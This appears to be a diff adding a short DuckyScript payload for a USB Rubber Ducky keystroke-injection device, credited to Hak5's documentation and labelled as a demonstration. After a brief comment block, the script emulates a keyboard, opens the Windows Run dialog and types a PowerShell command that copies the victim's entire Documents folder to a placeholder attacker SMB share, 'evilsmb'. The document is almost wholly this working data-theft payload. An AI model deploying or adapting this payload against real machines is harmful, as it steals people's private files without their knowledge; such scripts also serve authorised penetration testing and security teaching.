@@ -1,0 +1,15 @@
+
+REM_BLOCK
+    Credits:    Hak5
+    Website:    https://docs.hak5.org/
+    Source:     https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference#exfiltration
+
+    This piece of code is for demonstration purposes only; it needs to be adjusted.
+END_REM
+
+
+ATTACKMODE HID
+DELAY 2000
+GUI r
+DELAY 100
+STRINGLN powershell "cp -r $env:USERPROFILE\Documents\* \\evilsmb\share"
